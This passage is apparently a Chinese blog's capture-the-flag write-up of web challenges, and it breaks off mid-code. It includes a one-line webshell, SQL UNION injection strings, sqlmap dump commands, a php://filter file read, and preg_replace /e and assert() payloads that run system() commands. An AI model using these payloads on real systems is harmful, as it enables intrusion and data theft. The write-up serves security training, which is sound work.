提示查看HTTP响应，在消息头里发现flag。 disabled_button题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 知识补充：需要熟悉一些常见的HTML知识 实际操作：右键-&gt;查看元素，在input中用了‘disabled=” “’属性，双击，将其删掉，按钮便可正常使用。 simple_js题目描述： 小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 实际操作：打开链接空白，查看源码，有如下代码： 12345678910111213141516171819202122232425262728293031function dechiffre(pass_enc) &#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i, j, k, l = 0, m, n, o, p = \"\"; i = 0; j = tab.length; k = j + (l) + (n = 0); n = tab2.length; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; p += String.fromCharCode((o = tab2[i])); if (i == 5) break; &#125; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; if (i &gt; 5 &amp;&amp; i &lt; k - 1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p; return pass;&#125;String[\"fromCharCode\"](dechiffre( \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));h = window.prompt('Enter password');alert(dechiffre(h)); 这一长串16进制数很可疑， 1\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" 转字符得到：55,56,54,79,115,69,114,116,107,49,50再将其转换为10进制ASCII码对应的字符得到 ：786OsErtk12加上题目给出的格式得到flag（解码函数似乎不能得到正确密码//orz？） xff_referer题目描述：X老师告诉小宁其实xff和referer是可以伪造的。 实际操作：打开链接如图： 知识补充X-Forwarded-For和RefererXFF构造来源IPReferer构造来源浏览器 X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项 HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理利用bp抓包： 在HTTP头添加：X-Forwarded-For:123.123.123.123 得到下图提示： 再加一条Referer:https://www.google.com 得到flag。 1:(/images/7.5.png)由于每次添加都要重新输入，这里可以利用Repeater功能： 得到： 可以在左边直接编辑Request—&gt;右侧得到Response： Response—&gt;Flag! 自己编辑的时候注意Target的格式： 去掉请求协议http:// 相关知识URL与URI：https://blog.csdn.net/lslk9898/article/details/86490383 weak_auth题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 实际操作根据弹窗的提示，用户名必须是admin 将usename设置为admin，随手！！！真的是随手，输了个123456，结果对了hhh :) 正常解法 用Burp Suite对它进行密码爆破， 可以先试着输入username=admin和password=11111,以确定爆破位置。 Action—&gt;send to Intruder 基本配置：1、在消息编辑器的上方，有一个下拉选择框，攻击类型（Attack Type），几种不同的方式，这里选择：集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。 2、由于username规定用admin； 简单列表（Simple list） ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图 3、导入密码list 4、可选项设置（Options）可选项设置主要包括请求消息头设置、请求引擎设置、攻击结果设置、grep match, grep extract, grep payloads,以及重定向设置。在使用中，你可以在攻击前进行设置，也可以在攻击过程中做这些选项的调整。 开始爆破： 可以明显看到出现了长度不一样的响应，123456应该就是正确密码，查看Response得到Flag。 webshell题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 知识补充： webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 上传木马拿webshell的方法汇总 图片给出的代码为php一句话木马：一句话木马的工作原理：一句话木马分析服务端与客户端。 “一句话木马”服务端（是用于本地的html提交脚本木马文件） 就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件） 用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 用中国菜刀或者蚁剑等工具可以上传或执行命令，密码是shell。 连接成功： 选择双击： 看到flag.txt,打开： command_execution题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 知识补充：1、ping （网络诊断工具）Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址。该命令还可以加许多参数使用，具体是键入ping按回车即可看到详细说明。作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 2、有关命令执行的知识windows或linux下： 1234command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) 3、WAFWeb应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Web应用防火墙会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。（WAF绕过）此题给出未开WAF，所以不用考虑这一步。 4、还需要掌握一些常用的命令ls 对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。Cd 改变工作目录，将当前工作目录改变到指定的目录下。cat是打印文件内容tac 是反向打印less 文件名：分页显示文件内容（如less /etc/passwd）Find 沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应操作。关于find可以参考：https://www.jianshu.com/p/16af649d9b6d*&lt;利用截断来执行行的命令，如’$’ 和 ‘ ; ‘和 ‘|’ 和 ‘-‘ 和 ‘(‘ 和 ‘ ) ‘ 和 ‘ “ ‘ 和 ‘||’ 和’&amp;&amp;’ 和 ‘&amp;’ 和 ‘{‘ 和 ‘}’等&gt;* 实际操作： 试着使用命令连接符，查看目录 发现有home目录，看看里面有啥： 发现有flag.txt;或者直接根据文件名或正则表达式进行搜索，如下： 得到flag.txt在home下，cat一下： 同时这道题，查看代码可以发现：POST传参是通过参数target，而target就是我们所要输入的值 尝试post传值： 得到flag: simple_php题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 实际操作：打开链接： 很简单的PHP代码：a要等于0，又不能等于0；b不能是数字，但还要大于1234 is_numeric（）来函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE。 此处靠php弱类型比较：可查看我的这篇博文构造如下url: 高手进阶区baby_web题目提示：想想初始页面是哪个 实际操作：考虑到可能是页面302重定向抓包得到flag FlatScience实际操作点进去有好多链接，下载PDF，跳回等； 查看robots.txt(robots.txt:是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。)访问:http://111.198.29.45:34978/robots.txt 123User-agent: *Disallow: /login.phpDisallow: /admin.php 访问login.php:得到了一个登陆页面，尝试sqli,提示： 12Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: \"2801497d9ca18eef4382b18d1889b8bc97e28461\" in /var/www/html/login.php on line 47Some Error occourred! 可以看到使用的是SQLite数据库,还有加密操作？ 访问网页源码： 有参数提示debug;尝试访问login.php?debug得到如下php代码： 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo \"&lt;br&gt;Some Error occourred!\"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; 可以看到SQL的查询语句，并且对密码进行了加密操作(sha1+salt&lt;=（alz！）);页面注入不成，抓包分析下：构造： 1usr='union select name,sql from sqlite_master--+n&amp;pw=233 得到： 1Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; URL编码转换一下：%27=&gt;’;%28=&gt;(;%29=&gt;); 12CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) 看到Users表、id,name,password.hint字段；构造查询语句： 12345idusr='union select id,id from Users limit 0,1--&amp;pw=233usr='union select id,id from Users limit 1,1--&amp;pw=233usr='union select id,id from Users limit 2,1--&amp;pw=233得到3个id； 1234usr='union select id,name from Users limit 0,1--&amp;pw=233usr='union select id,name from Users limit 1,1--&amp;pw=233usr='union select id,name from Users limit 2,1--&amp;pw=233得到name：admin、fritze、hansi 1234567usr='union select id,password from Users limit 0,1--&amp;pw=233usr='union select id,password from Users limit 1,1--&amp;pw=233usr='union select id,password from Users limit 2,1--&amp;pw=233得到password：3fab54a50e770d830c0416df817567662a9dc85c54eae8935c90f467427f05e4ece82cf569f8950734b0bb7c304949f9ff2fc101eef0f048be10d3bd 1234567usr='union select id,hint from Users limit 0,1--&amp;pw=233usr='union select id,hint from Users limit 1,1--&amp;pw=233usr='union select id,hint from Users limit 2,1--&amp;pw=233得到hint：my+fav+word+in+my+fav+paper%3F%21my+love+is%E2%80%A6%3Fthe+password+is+password 根据admin用户的提示my fav word in my fav paper？！应该是：密码+”Salz!”做sha1处理，密码应该就产生于pdf中； 因为我门知道了加密结果直接解密去掉Salz就得到密码了： 解密 也可以用pdf中的单词进行+Salz!再做sha1； 借用一下别人的Python脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlib def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print \"Searching word in \" + i pdf_text = convert_pdf_2_text(i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word+\"Salz!\").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print \"Find the password :\" + word exit() if __name__ == \"__main__\": find_password() 知识补充‘’’os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。它不包括 . 和 .. 即使它在文件夹中。只支持在 Unix, Windows 下使用。语法listdir()方法语法格式如下：os.listdir(path)参数:path – 需要列出的目录路径返回值:返回指定路径下的文件和文件夹列表。‘’’‘’’endswith() 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。‘’’‘’’hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等。其中hash.digest()返回摘要，作为二进制数据字符串值hash.hexdigest()返回摘要，作为十六进制数据字符串值‘’’ 得到密码：ThinJerboa访问：admin.php 12username=adminpassword=ThinJerboa 得到flag Cat题目描述：仅给出了这样一个页面： 实际操作：输入cat，得到： 123456PING cat.ad-world-198302431-4658.rancher.internal (10.42.197.21) 56(84) bytes of data.64 bytes from b4fccc7cf554 (10.42.197.21): icmp_seq=1 ttl=64 time=0.045 ms--- cat.ad-world-198302431-4658.rancher.internal ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms 并在URL中如此传参： 1http://111.198.29.45:35113/index.php?url=cat 输入127.0.0.1： 123456PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms 尝试使用命令连接符/管道命令，均被屏蔽；目前仅知道，输入框通过用户输入进行GET方式传参；(此处请跳转文末 orz)那么只能从url入手了，看看有没有可能爆出一些有用的信息；测试发现超过ASCll可打印字符之外的url编码都会报错，比如键入http://111.198.29.45:35113/index.php?url=%8c ： 给出报错信息： 可以明显看到使用的是Django框架； 查看配置文件信息：settings.py 在报错信息中搜索database，发现的到有关数据库内容： 参考： 通过http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3 得到数据库内容：查找ctf关键字： 源码里就是GET啊，那这个又是啥？？？post?！orz orz orz ics-04问题分析： 本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”； 尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞； 构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" --dbs 得到库名结果； 库名 对每个数据库进行表名猜解；1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 --tables 对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user --columns 对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项 1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user -C \"username,password\" --dump 由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag； 此时对username查询可得到两条结果；第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；知识补充：如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\\Python27\\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；关于sqlmap使用：https://blog.csdn.net/qq_33530840/article/details/82144515 ics-05题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 实际操作：点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面： 除了index.php页面，没有其他有效信息，查看源码： 可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞； **本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:主要涉及到的函数：include(),require()、include_once(),require_once()magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;参考文章：https://blog.csdn.net/qq_29419013/article/details/81202358**尝试读取index.php的页面源码，通过php内置协议直接读取代码：?page=php://filter/read=convert.base64-encode/resource=index.php得到很长一串base64编码，解码得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"renderer\" content=\"webkit\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"&gt; &lt;link rel=\"stylesheet\" href=\"layui/css/layui.css\" media=\"all\"&gt; &lt;title&gt;设备维护中心&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class=\"layui-nav\"&gt; &lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;fieldset class=\"layui-elem-field layui-field-title\" style=\"margin-top: 30px;\"&gt; &lt;legend&gt;设备列表&lt;/legend&gt; &lt;/fieldset&gt; &lt;table class=\"layui-hide\" id=\"test\"&gt;&lt;/table&gt; &lt;script type=\"text/html\" id=\"switchTpl\"&gt; &lt;!-- 这里的 checked 的状态只是演示 --&gt; &lt;input type=\"checkbox\" name=\"sex\" value=\"&#123;&#123;d.id&#125;&#125;\" lay-skin=\"switch\" lay-text=\"开|关\" lay-filter=\"checkDemo\" &#123;&#123; d.id==1 0003 ? 'checked' : '' &#125;&#125;&gt; &lt;/script&gt; &lt;script src=\"layui/layui.js\" charset=\"utf-8\"&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function() &#123; var table = layui.table, form = layui.form; table.render(&#123; elem: '#test', url: '/somrthing.json', cellMinWidth: 80, cols: [ [ &#123; type: 'numbers' &#125;, &#123; type: 'checkbox' &#125;, &#123; field: 'id', title: 'ID', width: 100, unresize: true, sort: true &#125;, &#123; field: 'name', title: '设备名', templet: '#nameTpl' &#125;, &#123; field: 'area', title: '区域' &#125;, &#123; field: 'status', title: '维护状态', minWidth: 120, sort: true &#125;, &#123; field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;/script&gt; &lt;script&gt; layui.use('element', function() &#123; var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块 //监听导航点击 element.on('nav(demo)', function(elem) &#123; //console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &gt; 0) &#123; die(); &#125; if (strpos($page, 'text') &gt; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 源码审计，得到如下可能存在问题的关键部分： 123456789101112131415161718192021&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；**关于preg_replace：https://www.php.net/manual/zh/function.preg-replace.php**先来测试一下，看能不能输出关于PHP配置的信息； 构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’； 构造：验证成功！ 接下来尝试读取文件目录，利用system（）函数； 构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”): **%20url解释为空格、%26为&amp;** 得到flag文件，cd查看flag文件： 得到flag.php，使用cat查看内容： ics-06题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。 实际操作： 进入页面只有报表中心可以点击，有一个输入框，各种fuzzing，没成功，后来才知道直接爆破就行。。。 知识点补充：关于爆破 Lottery！题目分析：随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实， 实际操作:用burpsuite对输入彩票数字验证过程抓包，得到api.php; 不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 尝试访问： 可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)打开之前下载好的源文件： 打开api.php文件，可以看到以下验证彩票数字代码： 123456789101112131415161718192021222324252627282930$win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; 可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；改包： 发现已经获得$200000;多提交几余额就够了，buy-&gt;flag； NewsCenter题目分析：打开链接，出现如下页面：[N1]:(https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG) 实际操作： 尝试是否为sql注入：抓包： 利用sqlmap,命令：sqlmap.py -r 1.txt –dbs 看到有一个news，命令：sqlmap.py -r 1.txt -D news –dump 得到flag！ Mfw题目分析：打开链接，几个目录都看了下，发现： 可能存在git源码泄露，尝试访问.git目录： 实际操作：利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)： 在GitHack目录下可以看到网站源码文件夹： 在flag.php中只有如下内容： 1234&lt;?php// TODO// $FLAG = '';?&gt; 是将flag.php中的内容注释了，不显在网页上。 在index.php中发现关键代码： 12345678910111213&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; **assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false; 1234567891011/*PHP官方文档是怎么解释的：assert — 检查一个断言是否为 FALSE PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。*/ 123die() 函数输出一条消息，并退出当前脚本；strpos(string,find,start)查找find在字符串string中第一次出现的位置;file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。 **如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat templates/flag.php”);//{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码； Training-WWW-Robots知识点补充： robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科) 实际操作： 访问robots.txt，发现不允许访问fl0g.php 尝试访问/fl0g.php，得到flag； NaNNaNNaNNaN-Batman题目分析：下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框； 但是输入没有任何响应；回头再看看代码； 可以很明显看到,’’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval()函数执行_; **eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。**此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).为了能看到正常源码，将eval()改为alert()； **alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。| alert(message) | || :————: | :——————————————————–: || 参数 | 描述 || message | 要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本） |** 即： 1234567891011121314151617181920212223function $()&#123; var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null) &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var 